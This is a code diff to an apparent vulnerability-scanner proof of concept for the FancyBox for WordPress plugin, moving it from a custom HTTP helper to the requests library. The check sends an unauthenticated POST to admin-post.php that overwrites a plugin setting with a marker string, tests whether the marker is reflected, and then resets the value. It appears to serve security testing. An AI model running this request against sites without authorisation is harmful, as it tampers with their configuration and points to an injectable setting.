@@ -37,12 +37,12 @@ class Poc(ABPoc):
             url = arg
             verify_url = url + '/wp-admin/admin-post.php?page=fancybox-for-wordpress'
             payload = 'action=update&mfbfw%5Bpadding%5D=VulnerableTag'
-            hh.http('-d ' + payload + ' -L ' + verify_url)
-            code, head, res, errcode, _ = hh.http('-L ' + url)
+            _req = requests.post(verify_url, data=payload)
+            req1 = requests.get(verify_url)
             clearload = 'action=update&mfbfw%5Bpadding%5D=10'
-            hh.http('-d ' + clearload + ' -L ' + verify_url)
-            if 'VulnerableTag' in res:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+            _req = requests.post(verify_url, data=clearload)
+            if 'VulnerableTag' in req1.text:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
         except Exception, e:
